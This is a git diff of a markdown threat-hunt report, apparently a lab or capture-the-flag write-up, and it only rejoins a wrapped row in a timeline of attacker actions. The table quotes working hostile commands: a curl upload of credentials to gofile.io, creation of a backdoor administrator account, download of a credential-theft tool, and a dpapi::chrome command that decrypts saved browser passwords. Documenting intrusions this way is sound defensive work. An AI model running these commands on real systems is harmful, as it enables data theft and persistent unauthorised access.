@@ -78,8 +78,7 @@ Five days after the file server breach, threat actors returned with sophisticate
 | 04:39:16 |	**Flag 25** |	Credential Access |	Master Password Extraction → KeePass-Master-Password.txt |
 | 04:41:51 |	**Flag 22,23** |	Exfiltration |	Data Upload Command & Cloud Storage Service → "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile & gofile.io |
 | 04:41:52 |	**Flag 24** |	Exfiltration |	Destination Server IP → 45.112.123.227 |
-| 04:51:08 |	**Flag 9,10** |	Credential Access & Persistence |	Account Creation command & account created → net user yuki.tanaka2 B@ckd00r2024! /add
-& yuki.tanaka2 |
+| 04:51:08 |	**Flag 9,10** |	Credential Access & Persistence |	Account Creation command & account created → net user yuki.tanaka2 B@ckd00r2024! /add& yuki.tanaka2 |
 | 04:51:23 |	**Flag 11** |	Persistence |	Privilege Escalation Command → net localgroup Administrators yuki.tanaka2 /add |
 | 05:55:34 |	**Flag 20** |	Credential Access |	Credential Theft Tool Download → "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z |
 | 05:55:54 |	**Flag 21** |	Credential Access |	Browser Credential Theft  → "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit |
